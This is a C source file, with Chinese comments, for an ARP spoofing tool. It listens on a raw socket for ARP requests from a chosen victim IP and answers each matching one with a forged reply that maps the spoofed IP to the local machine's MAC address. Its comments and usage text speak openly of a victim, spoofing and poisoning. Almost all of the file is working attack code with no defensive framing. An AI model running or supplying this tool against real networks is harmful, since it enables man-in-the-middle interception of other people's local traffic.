#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

#define ETH_P_ARP 0x0806               // ARP 协议类型
#define ARP_REQUEST 1                  // ARP 操作码：请求
#define ARP_REPLY   2                  // ARP 操作码：应答
#define MAC_ADDR_LEN 6
#define IP_ADDR_LEN  4

// 以太网帧头部
struct eth_header {
    unsigned char  dest_mac[MAC_ADDR_LEN];
    unsigned char  src_mac[MAC_ADDR_LEN];
    unsigned short eth_type;           // 网络字节序
} __attribute__((packed));

// ARP 报文头部
struct arp_header {
    unsigned short hw_type;            // 硬件类型 (1 = Ethernet)
    unsigned short proto_type;         // 协议类型 (0x0800 = IP)
    unsigned char  hw_size;            // 硬件地址长度 (6)
    unsigned char  proto_size;         // 协议地址长度 (4)
    unsigned short opcode;             // 操作码 (1=请求, 2=应答)
    unsigned char  sender_mac[MAC_ADDR_LEN];
    unsigned char  sender_ip[IP_ADDR_LEN];
    unsigned char  target_mac[MAC_ADDR_LEN];
    unsigned char  target_ip[IP_ADDR_LEN];
} __attribute__((packed));

// 获取本机指定网卡的 MAC 地址和 IP 地址（用于填充真实发送者信息）
int get_local_mac_ip(const char *ifname, unsigned char *mac, unsigned char *ip) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        return -1;
    }

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

    // 获取 MAC
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl SIOCGIFHWADDR");
        close(fd);
        return -1;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, MAC_ADDR_LEN);

    // 获取 IP
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl SIOCGIFADDR");
        close(fd);
        return -1;
    }
    struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
    memcpy(ip, &sin->sin_addr.s_addr, IP_ADDR_LEN);

    close(fd);
    return 0;
}

// 发送 ARP 应答：告诉目标主机 “sender_ip 的 MAC 地址是 sender_mac”
void send_arp_reply(int sock, const unsigned char *sender_mac,
                    const unsigned char *sender_ip,
                    const unsigned char *target_mac,
                    const unsigned char *target_ip,
                    const unsigned char *dest_mac) {
    unsigned char packet[sizeof(struct eth_header) + sizeof(struct arp_header)];
    memset(packet, 0, sizeof(packet));

    // 1. 以太网头
    struct eth_header *eth = (struct eth_header *)packet;
    memcpy(eth->dest_mac, dest_mac, MAC_ADDR_LEN);        // 目的 MAC：被回复的主机
    memcpy(eth->src_mac,  sender_mac,  MAC_ADDR_LEN);     // 源 MAC：本机
    eth->eth_type = htons(ETH_P_ARP);

    // 2. ARP 头
    struct arp_header *arp = (struct arp_header *)(packet + sizeof(struct eth_header));
    arp->hw_type    = htons(1);                            // Ethernet
    arp->proto_type = htons(ETH_P_IP);                     // IPv4
    arp->hw_size    = MAC_ADDR_LEN;
    arp->proto_size = IP_ADDR_LEN;
    arp->opcode     = htons(ARP_REPLY);                    // 应答

    // 发送者信息：声称 sender_ip 的 MAC 是 sender_mac
    memcpy(arp->sender_mac, sender_mac, MAC_ADDR_LEN);
    memcpy(arp->sender_ip, sender_ip, IP_ADDR_LEN);

    // 目标信息：被回复的主机
    memcpy(arp->target_mac, target_mac, MAC_ADDR_LEN);
    memcpy(arp->target_ip, target_ip, IP_ADDR_LEN);

    // 通过原始套接字发送
    if (send(sock, packet, sizeof(packet), 0) < 0) {
        perror("send ARP reply");
    } else {
        printf("[+] Sent ARP reply: %d.%d.%d.%d is at %02x:%02x:%02x:%02x:%02x:%02x\n",
               sender_ip[0], sender_ip[1], sender_ip[2], sender_ip[3],
               sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]);
    }
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
	printf("Usage: %s <interface> <victim_ip> <spoofed_ip>\n", argv[0]); 
        return 1;
    }

    const char *ifname  = argv[1];
    const char *victim_ip_str = argv[2];
    const char *spoofed_ip_str = argv[3];

    unsigned char my_mac[MAC_ADDR_LEN];
    unsigned char my_ip[IP_ADDR_LEN];

    // 1. 获取本机网卡的真实 MAC 和 IP（用作发送者信息）
    if (get_local_mac_ip(ifname, my_mac, my_ip) < 0) {
        fprintf(stderr, "Failed to get local MAC/IP for %s\n", ifname);
        return 1;
    }

    // 2. 解析命令行中的 IP 地址
    unsigned char victim_ip[IP_ADDR_LEN];
    unsigned char spoofed_ip[IP_ADDR_LEN];
    {
        struct in_addr addr;
        if (inet_pton(AF_INET, victim_ip_str, &addr) != 1) {
            fprintf(stderr, "Invalid victim IP: %s\n", victim_ip_str);
            return 1;
        }
        memcpy(victim_ip, &addr.s_addr, IP_ADDR_LEN);
    }
    {
        struct in_addr addr;
        if (inet_pton(AF_INET, spoofed_ip_str, &addr) != 1) {
            fprintf(stderr, "Invalid spoofed IP: %s\n", spoofed_ip_str);
            return 1;
        }
        memcpy(spoofed_ip, &addr.s_addr, IP_ADDR_LEN);
    }

    printf("[*] Local MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
           my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
    printf("[*] Local IP : %d.%d.%d.%d\n",
           my_ip[0], my_ip[1], my_ip[2], my_ip[3]);
    printf("[*] Spoofing: %s claims to be %s\n", victim_ip_str, spoofed_ip_str);

    // 3. 创建原始套接字（AF_PACKET, SOCK_RAW）
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("socket(AF_PACKET)");
        fprintf(stderr, "Hint: run as root or with CAP_NET_RAW\n");
        return 1;
    }

    // 4. 绑定到指定网卡
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ARP);
    sll.sll_ifindex = if_nametoindex(ifname);
    if (sll.sll_ifindex == 0) {
        perror("if_nametoindex");
        close(sock);
        return 1;
    }
    if (bind(sock, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
        perror("bind");
        close(sock);
        return 1;
    }

    printf("[*] Listening for ARP requests on %s...\n", ifname);

    // 5. 主循环：接收 ARP 包，一旦发现对 spoofed_ip 的请求，立即回复伪造应答
    unsigned char buffer[ETH_FRAME_LEN];
    while (1) {
        ssize_t len = recv(sock, buffer, sizeof(buffer), 0);
        if (len < 0) {
            perror("recv");
            break;
        }

        // 只处理完整 ARP 包
        if ((size_t)len < sizeof(struct eth_header) + sizeof(struct arp_header))
            continue;

        struct eth_header *eth = (struct eth_header *)buffer;
        if (ntohs(eth->eth_type) != ETH_P_ARP)
            continue;

        struct arp_header *arp = (struct arp_header *)(buffer + sizeof(struct eth_header));

        // 只关心 ARP 请求（opcode == 1），且请求的 target_ip 正是我们要欺骗的 IP
        if (ntohs(arp->opcode) != ARP_REQUEST)
            continue;

        if (memcmp(arp->target_ip, spoofed_ip, IP_ADDR_LEN) != 0)
            continue;

        if (memcmp(arp->sender_ip, victim_ip, IP_ADDR_LEN) != 0)
            continue;

        printf("[>] Caught ARP request for %d.%d.%d.%d from %d.%d.%d.%d / %02x:%02x:%02x:%02x:%02x:%02x\n",
               spoofed_ip[0], spoofed_ip[1], spoofed_ip[2], spoofed_ip[3],
               arp->sender_ip[0], arp->sender_ip[1], arp->sender_ip[2], arp->sender_ip[3],
               arp->sender_mac[0], arp->sender_mac[1], arp->sender_mac[2],
               arp->sender_mac[3], arp->sender_mac[4], arp->sender_mac[5]);

        // 发送伪造的 ARP 应答：告诉请求者 “spoofed_ip 的 MAC 是 my_mac”
        // RFC 826: reply 中 ar$tha/ar$tpa 对应原请求的 ar$sha/ar$spa
        send_arp_reply(sock, my_mac, spoofed_ip, arp->sender_mac, arp->sender_ip, arp->sender_mac);

        // 也可以额外直接给受害主机发送一个免费的 ARP 应答，加速污染
        // （但上面的回复已经足够）
    }

    close(sock);
    return 0;
}
